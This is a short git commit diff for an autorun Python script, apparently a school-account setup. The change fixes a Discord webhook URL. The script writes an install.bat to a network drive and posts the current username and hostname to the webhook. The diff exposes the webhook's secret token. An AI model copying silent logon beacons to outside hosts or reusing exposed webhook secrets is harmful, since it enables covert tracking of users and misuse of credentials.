1fa54e11abaf3f507026ad78c4dbb97971a79244
PaperTarsier692 <moritz.harrer@icloud.com>
2024-10-25 08:16:45 +0200

    fixed wrong url in autorun.py

--- autorun.py
+++ autorun.py
@@ -15,6 +15,5 @@ if not os.path.exists('Y:/2BHIT/moritz/install.bat'):
     File('Y:/2BHIT/moritz/install.bat').write(install_cmd, create_path=True)
 
 
-Webhook('https://discord.com/api/webhooks/1297869752814796830/VLTxydNqN0_\
-        -4svxARDEQMCucjnP7vIr3kiFdv4lIkT4CrBTDzUN-c4jYfORnWU7mEnl').send(
+Webhook('https://discord.com/api/webhooks/1297869752814796830/VLTxydNqN0_-4svxARDEQMCucjnP7vIr3kiFdv4lIkT4CrBTDzUN-c4jYfORnWU7mEnl').send(
     f'Logged on as {getuser()} at {gethostname()}')
